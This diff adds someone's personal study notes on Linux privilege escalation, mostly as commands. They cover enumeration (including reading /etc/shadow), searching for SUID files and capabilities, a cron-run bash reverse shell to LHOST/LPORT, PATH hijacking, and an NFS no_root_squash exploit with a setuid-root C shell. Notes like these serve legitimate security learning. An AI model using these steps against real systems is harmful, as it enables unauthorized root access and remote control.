@@ -1,0 +1,99 @@
+Notes on privilege esc - might be formatted later (probably not)
+
+extremely useful - https://gtfobins.github.io/#
+
+0. Enumeration
+hostname
+/proc/version - info about system processes
+/etc/issue - info about OS
+ps -A - all running processes
+ps axjf - view process trree
+ps aux - processes for all users
+env - environmental variables
+sudo -l
+ls -l
+id
+/etc/passwd
+/etc/shadow
+history
+ifconfig
+netstat -a - all listening ports and established connections
+        -at or netstat -au - lists TCP/UDP respectively
+        -l - lists ports in listening mode
+        -s - network usage statistics
+        -t - connections with service name and PID
+        -i - interface stats
+        -ano - display all sockets, do not resolve names, do not display timers
+find writable folders        
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+
+find world-executable folders
+find / -perm -o x -type d 2>/dev/null
+
+find development tools and supported languages
+find / -name perl*
+find / -name python*
+find / -name gcc*
+
+find files with SUID bit
+find / -perm -u=s -type f 2>/dev/null
+
+1. Kernel Exploits
+
+2. Sudo
+sudo -l
+
+3. SUID
+find / -type f -perm -04000 -ls 2>/dev/null    -   will list files that have SUID or SGID bits set
+
+4. Capabilities
+getcap -r / 2>/dev/null
+
+5. Cron Jobs
+/etc/crontab
+
+reverse shell example invoked with cron
+#!/bin/bash
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+6. PATH - in Linux is an environmental variable that tells the operating system where to search for executables.
+What folders are located under $PATH
+Does your current user have write privileges for any of these folders?
+Can you modify $PATH?
+Is there a script/application you can start that will be affected by this vulnerability?
+
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+
+to add /tmp to PATH:
+export PATH=/tmp:$PATH
+
+7. NFS - Network File Sharing
+/etc/exports - holds NFS
+If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+enumerate mountable shares
+showmount -e RHOST
+
+mount the vuln share to our attacking machine 
+
+mkdir /tmp/backuponattackermachine
+mount -o rw RHOST:/backup /tmp/backuponattackermachine
+
+and build exec in the share
+
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+ }
+
+compile the file
+
+gcc nfs.c -o nfs -w
+
+set the SUID bit
+
+chmod +s nfs
